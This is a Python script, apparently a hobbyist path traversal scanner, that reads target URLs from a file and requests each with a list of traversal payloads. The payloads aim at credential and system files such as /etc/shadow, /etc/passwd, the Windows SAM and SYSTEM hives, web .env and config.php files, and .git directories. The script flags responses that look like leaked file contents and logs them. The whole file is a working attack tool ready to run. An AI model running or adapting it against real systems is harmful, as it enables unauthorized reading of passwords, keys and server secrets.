import requests
import os
import random
from colorama import init, Fore, Style

# Initialize colorama for Windows compatibility
init(autoreset=True)

# Define a list of colors for the banner
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]

# Function to display the banner from the banner file in a random color
def display_banner(banner_file):
    try:
        # Randomly select a color from the list
        banner_color = random.choice(colors)
        with open(banner_file, 'r') as file:
            banner = file.read()
            # Print the banner in the randomly selected color
            print(banner_color + banner + Style.RESET_ALL)
    except FileNotFoundError:
        print(f"Error: Banner file '{banner_file}' not found.")

# List of payloads to test for path traversal vulnerabilities
payloads = [
    # Linux/Unix sensitive files
    "../../etc/passwd",
    "../../../../etc/passwd",
    "../../etc/shadow",
    "../../../../etc/shadow",
    "../../etc/hosts",
    "../../../../etc/hosts",
    "../../etc/hostname",
    "../../../../etc/hostname",
    "../../etc/issue",
    "../../../../etc/issue",
    "../../var/log/auth.log",
    "../../../../var/log/auth.log",
    "../../var/log/syslog",
    "../../../../var/log/syslog",
    
    # Windows sensitive files
    "../../windows/system32/config/SAM",
    "../../../../windows/system32/config/SAM",
    "../../windows/system32/config/system",
    "../../../../windows/system32/config/system",
    "../../windows/system32/drivers/etc/hosts",
    "../../../../windows/system32/drivers/etc/hosts",
    "../../windows/system32/config/software",
    "../../../../windows/system32/config/software",
    "../../windows/system32/repair/SAM",
    "../../../../windows/system32/repair/SAM",
    
    # Web server configuration files
    "../../var/www/html/.env",
    "../../../../var/www/html/.env",
    "../../var/www/html/config.php",
    "../../../../var/www/html/config.php",
    "../../var/www/html/.git",
    "../../../../var/www/html/.git"
]

# Function to write results to a log file
def log_result(file_name, result):
    # Open the file in append mode, so it adds to the end of the file
    with open(file_name, 'a') as log_file:
        log_file.write(result + '\n')

# Function to test a single URL with a list of payloads
def test_url_for_traversal(url, log_file):
    print(f"\nTesting {url}")
    log_result(log_file, f"\nTesting {url}")
    vulnerable = False
    
    for payload in payloads:
        test_url = url.strip() + payload
        try:
            response = requests.get(test_url, timeout=5)
            # Check for signs of successful path traversal:
            if "root:x" in response.text or "127.0.0.1" in response.text or "user:" in response.text or "SAM" in response.text:
                result = f"[+] Potential Vulnerability Found! Payload: {test_url}"
                print(result)
                log_result(log_file, result)
                vulnerable = True
            elif response.status_code == 200:
                result = f"[+] Possibly suspicious response with 200 OK for: {test_url}"
                print(result)
                log_result(log_file, result)
            else:
                result = f"[-] Not Vulnerable with payload: {payload}"
                print(result)
                log_result(log_file, result)
        except requests.exceptions.RequestException as e:
            error_message = f"Error occurred: {e}"
            print(error_message)
            log_result(log_file, error_message)
    
    return vulnerable

# Function to read URLs from a file and test each URL
def read_urls_from_file(file_path, log_file):
    try:
        with open(file_path, 'r') as file:
            urls = file.readlines()
            for url in urls:
                test_url_for_traversal(url, log_file)
    except FileNotFoundError:
        error_message = f"Error: File '{file_path}' not found."
        print(error_message)
        log_result(log_file, error_message)
    except Exception as e:
        error_message = f"An error occurred: {e}"
        print(error_message)
        log_result(log_file, error_message)

# Main logic: specify the path to the text file containing URLs and banner file
urls_file = 'urls.txt'  # Replace with the path to your text file containing the URLs
log_file = 'results_log.txt'  # The log file to save results
banner_file = 'bannner.txt'  # Path to the banner file

# Display the banner at the start of the script with a random color
display_banner(banner_file)

# Remove existing log file if it exists (so you start fresh with each run)
if os.path.exists(log_file):
    os.remove(log_file)

# Start the process by reading URLs from the file and testing them
read_urls_from_file(urls_file, log_file)

print(f"\nResults have been saved to {log_file}")
